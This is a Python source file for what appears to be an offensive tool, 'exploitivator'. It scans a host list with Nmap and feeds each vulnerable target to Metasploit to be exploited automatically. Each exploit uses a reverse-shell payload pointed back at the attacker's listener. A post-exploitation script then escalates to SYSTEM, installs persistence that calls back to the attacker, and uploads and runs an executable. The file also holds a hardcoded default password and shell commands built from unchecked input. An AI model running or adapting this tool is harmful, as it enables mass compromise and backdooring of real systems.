#!/usr/bin/env python3

import os
import optparse
import sys
import subprocess
import datetime
import time
import requests

import xml.etree.ElementTree as ET

from pymetasploit3.msfrpc import MsfRpcClient
from collections import defaultdict


# Function to create the MSF .rc files
def builder(rhost, lhost, lport):
    post = open('/tmp/smbpost.rc', 'w')
    bat = open('/tmp/exploit_install.bat', 'w')

    postcomms = f"""getsystem
run persistence -S -U -X -i 10 -p 80 -r {lhost}
cd c:\
upload /tmp/exploit_patch.exe c:\
upload /tmp/exploit_install.bat c:\
execute -f exploit_install.bat
    """

    batcomm = "exploit_patch.exe /quiet"
    post.write(postcomms)
    bat.write(batcomm)
    post.close()
    bat.close()


def initialise(msf_pass):
    global msf_client
    global console_id
    global outfile

    # Initialize the MSF RPC client using pymetasploit3
    #msf_client = MsfRpcClient(msf_pass)
    msf_client = MsfRpcClient(msf_pass, server='127.0.0.1', port=55552) 
    
    # Create a new console
    res = msf_client.consoles.console()
    console_id = res.cid
    print(f"res: {res}")

    # Connect to the database (optional, adjust if needed)
    msf_client.consoles.console(console_id).write(f"db_connect {msf_pass}@127.0.0.1/msf\n")
    time.sleep(1)


# Function to exploit a target
def exploit(rhost, lhost, lport, session, attack, payload, label):
    # Exploit the host
    commands = f"""use {attack}
set PAYLOAD {payload}
set RHOST {rhost}
set LHOST {lhost}
set LPORT {str(lport)}
set ExitOnSession false
exploit -z
"""
    print(f"[+] Exploiting {label} on: {rhost}")
    print(f"[+] Exploit: {attack}")
    print(f"[+] Payload: {payload}")
    msf_client.consoles.console(console_id).write(commands)
    time.sleep(10)

    # Post-exploit
    runPost = f"""use post/multi/gather/run_console_rc_file
set RESOURCE /tmp/smbpost.rc
set SESSION {str(session)}
exploit
"""
    print(f"[+] Running post-exploit script on: {rhost}")
    msf_client.consoles.console(console_id).write(runPost)
    time.sleep(10)


def parse_nmap_xml(xmlfile):
    # Parse the XML file from Nmap
    details = xmlfile.split(" ")
    filename = details[1]
    tree = ET.parse(filename)
    root = tree.getroot()

    results = {}
    target = ""
    state = ""

    for item in root.iter('host'):
        for child in item:
            if child.tag == 'address' and child.attrib['addrtype'] == 'ipv4':
                target = child.attrib['addr']
                state = ""
            elif child.tag == 'hostscript':
                for subitem in child.iter('elem'):
                    if 'key' in subitem.attrib:
                        if subitem.attrib['key'] == 'state':
                            state = subitem.text
                            if target.strip() != "":
                                results.update({target: state})
                                target = ""
                                state = ""

    return results


def parse_gnmap(nmapfile, grep_ex):
    details = nmapfile.split(" ")
    filename = details[1]
    results = {}

    # Read and process the GNMAP file
    cmd_line = f'cat {filename} | {grep_ex} | cut -d" " -f2 > temp.txt'
    os.system(cmd_line)

    # Safely attempt to open temp.txt, handling the case where it might not exist
    try:
        with open('temp.txt') as infile:
            vuln_hosts = infile.readlines()
    except FileNotFoundError:
        print("Error: temp.txt file not found. Ensure the GNMAP file is correctly processed.")
        return results

    # Process the contents of temp.txt
    for target in vuln_hosts:
        results.update({target.strip(): 'vulnerable'})

    os.system('rm temp.txt')

    return results


def main():
    session = 1
    msf_pass = "abc123"
    lport = 4444
    sleep_time = 30
    wait_for_key = False

    # Command-line arguments
    parser = optparse.OptionParser(sys.argv[0] + ' -l lhost -p lport -f host_file -s session -m msf_pass')

    parser.add_option('-l', dest='lhost', type='string', help='Specify the IP address of the attacking machine')
    parser.add_option('-p', dest='lport', type='string', help='Specify a port to listen on')
    parser.add_option('-f', dest='host_file', type='string', help='Specify a file listing the remote hosts')
    parser.add_option('-s', dest='session', type='string', help='Specify a starting session ID')
    parser.add_option('-m', dest='msf_pass', type='string', help='Specify the password for the MSF instance')

    (options, args) = parser.parse_args()

    if options.msf_pass:
        msf_pass = options.msf_pass
    if options.session:
        session = int(options.session)
    if options.lport:
        lport = int(options.lport)

    host_file = options.host_file
    lhost = options.lhost

    if not host_file or not lhost:
        print("Usage: exploitivator.py -l <local_host_ip> -f <target_list_file> [-p local_port -s <initial_session_id> -m <password>]")
        sys.exit(0)

    # Initialize the MSF session
    initialise(msf_pass)

    # Create an output log file
    outfile = open("exploitivator_output.txt", "w")
    outfile.write("MSF Attack Logs\n===============\n\n")

    # Nmap scans
    scan_file = "exploitivator_scan.cfg"
    config_file = "exploitivator.cfg"

    print(f"[*] Getting exploit requirements from file: {scan_file}")

    with open(scan_file) as infile:
        scans = [scan.strip() for scan in infile.readlines()]

    scan_settings = {}
    for scan in scans:
        items = scan.split("##")
        if len(items) < 3:
            print("[!] Bad scan config file entry!")
            sys.exit(2)
        scan_settings.update({items[0]: items[1:]})

    print("[*] Beginning Nmap scans...")
    for details in scan_settings.values():
        script_detail = details[0]
        script_outfile = details[1]
        cmd_line = f"nmap {script_detail} {script_outfile} -iL {host_file} &"
        print(f"Executing: {cmd_line}")
        os.system(cmd_line)

    time.sleep(sleep_time)

    with open(config_file) as infile:
        sploits = [sploit.strip() for sploit in infile.readlines()]

    sploit_settings = {}
    for sploit in sploits:
        items = sploit.split("##")
        if len(items) < 3:
            print(f"[!] Bad config file entry: {sploit}")
            sys.exit(2)
        sploit_settings.update({items[0]: items[1:]})

    print("[*] Beginning exploitation attempts...")

    for attack in scan_settings:
        print(f"[*] Checking targets for {attack}\n")
        outfile.write("=========================================================\n")
        outfile.write(f"Vulnerability: {attack}\n")
        outfile.write("---------------------------------------------------------\n")

        script_outfile = scan_settings[attack][1]
        if script_outfile.endswith(".xml"):
            target_map = parse_nmap_xml(script_outfile)

            for target_host, state in target_map.items():
                if state.lower() in ['vulnerable', 'likely vulnerable']:
                    print(f"[*] Attempting to exploit: {target_host}")
                    outfile.write(f"Target: {target_host}\n")
                    outfile.write(f"Session: {str(session)}\n")

                    exploit(target_host, lhost, lport, session, sploit_settings[attack][0], sploit_settings[attack][1], attack)
                    lport += 1
                    session += 1

        elif script_outfile.endswith(".gnmap"):
            target_map = parse_gnmap(script_outfile, scan_settings[attack][2])

            for target_host, state in target_map.items():
                print(f"[*] Attempting to exploit: {target_host}")
                outfile.write(f"Target: {target_host}\n")
                outfile.write(f"Session: {str(session)}\n")

                exploit(target_host, lhost, lport, session, sploit_settings[attack][0], sploit_settings[attack][1], attack)
                lport += 1
                session += 1

    print("[*] Finished!")
    outfile.close()


if __name__ == "__main__":
    main()
